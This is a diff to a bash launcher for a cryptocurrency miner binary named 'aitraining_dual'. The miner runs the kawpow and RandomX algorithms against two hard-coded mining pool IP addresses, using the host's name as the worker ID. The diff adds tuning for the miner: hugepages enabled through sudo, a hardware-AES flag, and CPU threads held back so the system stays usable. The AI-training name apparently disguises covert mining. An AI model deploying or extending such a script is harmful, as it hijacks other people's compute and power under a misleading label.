@@ -1,6 +1,12 @@
 #!/bin/bash
+
 WORKER="$HOSTNAME"
+
+# Detect CPU threads and leave 1-2 free for system
 CPU_THREADS=$(($(grep -c '^processor' /proc/cpuinfo) - 2))
+if [ $CPU_THREADS -lt 1 ]; then CPU_THREADS=1; fi
+
+# Export GPU environment variables (optional for kawpow)
 export GPU_MAX_HEAP_SIZE=100
 export GPU_MAX_USE_SYNC_OBJECTS=1
 export GPU_SINGLE_ALLOC_PERCENT=100
@@ -8,7 +14,15 @@ export GPU_MAX_ALLOC_PERCENT=100
 export GPU_MAX_SINGLE_ALLOC_PERCENT=100
 export GPU_ENABLE_LARGE_ALLOCATION=100
 export GPU_MAX_WORKGROUP_SIZE=1024
+
+# Enable hugepages for RandomX (temporary, until reboot)
+sudo sysctl -w vm.nr_hugepages=128
+
+# Export HW-AES optimization for RandomX (automatically used if supported)
+export RANDOMX_USE_HW_AES=1
+
 chmod +x aitraining_dual
+
 ./aitraining_dual \
     --algorithm "kawpow;randomx" \
     --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
@@ -16,4 +30,5 @@ chmod +x aitraining_dual
     --worker "$WORKER;$WORKER" \
     --password "x;x" \
     --cpu-threads "0;$CPU_THREADS" \
+    --randomx-hugepages 1 \
     --keepalive true
